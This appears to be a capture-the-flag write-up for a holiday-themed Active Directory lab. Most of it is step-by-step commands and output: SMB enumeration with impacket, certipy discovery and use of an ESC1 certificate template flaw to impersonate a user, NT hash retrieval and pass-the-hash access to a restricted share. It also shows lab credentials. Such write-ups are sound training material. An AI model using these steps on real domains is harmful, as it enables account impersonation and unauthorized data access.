Ribb Bonbowford expressed his concerns about the AD and hinted we are already in the AD environment. Let's use the information obtained from previous tasks and work for this challenge.

Upon listing the files in Alabaster home directory we see the impacket tool suite is present. Let's use the smbclient package to access the SMB share using credentials obtained in Azure Key vault. 

````
alabaster@ssh-server-vm:~/impacket$ smbclient.py elfy@10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra
Password:
````
```
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
# use FIleShare
# ls
drw-rw-rw-          0  Thu Jan 18 01:12:55 2024 .
drw-rw-rw-          0  Thu Jan 18 01:12:52 2024 ..
-rw-rw-rw-     701028  Thu Jan 18 01:12:54 2024 Cookies.pdf
-rw-rw-rw-    1521650  Thu Jan 18 01:12:55 2024 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Thu Jan 18 01:12:55 2024 SignatureCookies.pdf
drw-rw-rw-          0  Thu Jan 18 01:12:54 2024 super_secret_research
-rw-rw-rw-        165  Thu Jan 18 01:12:55 2024 todo.txt
# get todo.txt
# exit
alabaster@ssh-server-vm:~/impacket$ cat todo.txt 
1. Bake some cookies.
2. Restrict access to C:\FileShare\super_secret_research to only researchers so everyone cant see the folder or read its contents
3. Profit
````
 Next task would be to get access to **C:\FileShare\super_secret_research** 

 Remember the task Reportinator where it says there is a ADCS vulnerability in the AD Environment, we will explore that. Since we have the certipy already present in Alabaster host we will use it to find if there are any 
  
````
alabaster@ssh-server-vm:~/impacket$ certipy find -vulnerable -u elfy -p J4\`ufC49/J4766 -dc-ip 10.0.0.53 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Authenticating to LDAP server
[+] Bound to ldaps://10.0.0.53:636 - ssl
[+] Default path: DC=northpole,DC=local
[+] Configuration path: CN=Configuration,DC=northpole,DC=local
[+] Adding Domain Computers to list of current user's SIDs
[+] List of current user's SIDs:
     NORTHPOLE.LOCAL\Domain Computers (S-1-5-21-1242573302-2981867581-2555354284-515)
     NORTHPOLE.LOCAL\Users (NORTHPOLE.LOCAL-S-1-5-32-545)
     NORTHPOLE.LOCAL\Everyone (NORTHPOLE.LOCAL-S-1-1-0)
     NORTHPOLE.LOCAL\Domain Users (S-1-5-21-1242573302-2981867581-2555354284-513)
     NORTHPOLE.LOCAL\Authenticated Users (NORTHPOLE.LOCAL-S-1-5-11)
     NORTHPOLE.LOCAL\elfy (S-1-5-21-1242573302-2981867581-2555354284-1104)
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[+] Trying to resolve 'npdc01.northpole.local' at '10.0.0.53'
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA
[+] Trying to get DCOM connection for: 10.0.0.53
[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[+] Connected to remote registry at 'npdc01.northpole.local' (10.0.0.53)
[*] Got CA configuration for 'northpole-npdc01-CA'
[+] Resolved 'npdc01.northpole.local' from cache: 10.0.0.53
[+] Connecting to 10.0.0.53:80
[*] Saved BloodHound data to '20240118082058_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20240118082058_Certipy.txt'
[*] Saved JSON output to '20240118082058_Certipy.json'
````
The output of Certipy shows that it is vulnerable to ESC2
[!] Vulnerabilities
ESC1 : 'NORTHPOLE.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
   
ESC1 is when a certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN).
For ESC1, we can request a certificate based on the vulnerable certificate template and specify an arbitrary UPN or DNS SAN with the -upn and -dns parameter, respectively.

````
alabaster@ssh-server-vm:~$ certipy req -u elfy@northpole.local -p J4\`ufC49/J4766 -ca northpole-npdc01-CA -dc-ip 10.0.0.53 -template NorthPoleUsers -upn alabaster@northpole.local -dns npdc01.northpole.local
````
````
alabaster@ssh-server-vm:~$ certipy req -u elfy@northpole.local -p J4\`ufC49/J4766 -ca northpole-npdc01-CA -dc-ip 10.0.0.53 -template NorthPoleUsers -upn alabaster@northpole.local
````
````
alabaster@ssh-server-vm:~$ certipy auth -pfx alabaster.pfx -dc-ip 10.0.0.53 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: alabaster@northpole.local
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)
````
Could not get anything for alabaster let's search if we can find any other used for whom we can request a certificate.
````
alabaster@ssh-server-vm:~/impacket$ GetADUsers.py -all -dc-ip 10.0.0.53 'northpole.local/elfy:J4`ufC49/J4766'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying 10.0.0.53 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
alabaster                                             2024-01-19 01:02:52.517117  2024-01-19 01:16:50.870757 
Guest                                                 <never>              <never>             
krbtgt                                                2024-01-19 01:10:45.513065  <never>             
elfy                                                  2024-01-19 01:13:05.023950  2024-01-19 21:58:23.893726 
wombleycube                                           2024-01-19 01:13:05.164594  2024-01-19 21:56:04.315004 
````
Wombleycube could help us, let's relauch certipy with Wombley
````
alabaster@ssh-server-vm:~$ certipy req -u elfy@northpole.local -p J4\`ufC49/J4766 -ca northpole-npdc01-CA -dc-ip 10.0.0.53 -template NorthPoleUsers -upn wombleycube@northpole.local
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 22
[*] Got certificate with UPN 'wombleycube@northpole.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'wombleycube.pfx'
alabaster@ssh-server-vm:~$ certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53 -debugCertipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'wombleycube.ccache'
[*] Trying to retrieve NT hash for 'wombleycube'
[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
````
Let's connect to the fileshare with wombleycube hash and read what is inside ** super_secret_research**
````
alabaster@ssh-server-vm:~/impacket$ smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 northpole.local/wombleycube@10.0.0.53
# use FileShare
# ls
drw-rw-rw-          0  Fri Jan 19 01:14:00 2024 .
drw-rw-rw-          0  Fri Jan 19 01:13:56 2024 ..
-rw-rw-rw-     701028  Fri Jan 19 01:13:59 2024 Cookies.pdf
-rw-rw-rw-    1521650  Fri Jan 19 01:14:00 2024 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Fri Jan 19 01:14:00 2024 SignatureCookies.pdf
drw-rw-rw-          0  Fri Jan 19 01:13:59 2024 super_secret_research
-rw-rw-rw-        165  Fri Jan 19 01:14:00 2024 todo.txt
# cd super_secret_research
# ls
drw-rw-rw-          0  Fri Jan 19 01:14:00 2024 .
drw-rw-rw-          0  Fri Jan 19 01:14:00 2024 ..
-rw-rw-rw-        231  Fri Jan 19 01:14:00 2024 InstructionsForEnteringSatelliteGroundStation.txt
# get InstructionsForEnteringSatelliteGroundStation.txt
````
The task is completed by giving the name of the file.

The text file contained

$\color{yellow}{\textsf{Note to self:}}$

$\color{gold}{\textsf{To enter the Satellite Ground Station (SGS), say the following into the speaker:}}$

$\color{yellow}{\textsf{And he whispered, 'Now I shall be out of sight;}}$
$\color{gold}{\textsf{So through the valley and over the height.'}}$
$\color{yellow}{\textsf{And he'll silently take his way.}}$

</details>
